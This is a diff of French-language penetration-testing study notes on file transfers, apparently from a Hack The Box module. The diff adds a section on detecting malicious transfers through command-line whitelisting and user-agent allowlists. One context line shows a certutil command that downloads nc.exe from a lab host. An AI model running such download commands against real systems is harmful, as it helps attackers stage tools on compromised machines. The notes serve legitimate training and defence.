@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T15:55:29.001Z
+date: 2025-05-04T16:04:28.827Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -958,3 +958,16 @@ certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 ```
 
 ## Detection
+
+De nombreux moyens sont disponibles pour détecter un tel usage. En voici quelques-uns.
+
+La détection en ligne de commande basée sur une liste noire est facile à contourner, même avec une obfuscation simple. Cependant, la mise en place d'une liste blanche des lignes de commande, bien que chronophage au départ, est robuste et permet une détection rapide des anomalies.
+
+Les clients HTTP sont identifiés par leur chaîne d'agent utilisateur (user agent), qui permet au serveur de reconnaître le client (par exemple, Firefox, Chrome, etc.).
+Les agents utilisateurs ne servent pas seulement à identifier les navigateurs, mais aussi tout outil agissant comme un client HTTP, comme cURL, un script Python, ou des outils comme sqlmap et Nmap.
+
+Les organisations peuvent créer une liste des user-agents légitimes, incluant ceux des processus système, des services de mise à jour (comme Windows Update), et des mises à jour antivirus. Ces listes peuvent être utilisées dans des outils SIEM pour la détection de menaces, afin de filtrer le trafic légitime et se concentrer sur les anomalies.
+
+Donc les transferts de fichiers malveillants peuvent également être détectés grâce aux user-agent, dont certains sont associés à des techniques courantes de transfert.
+
+
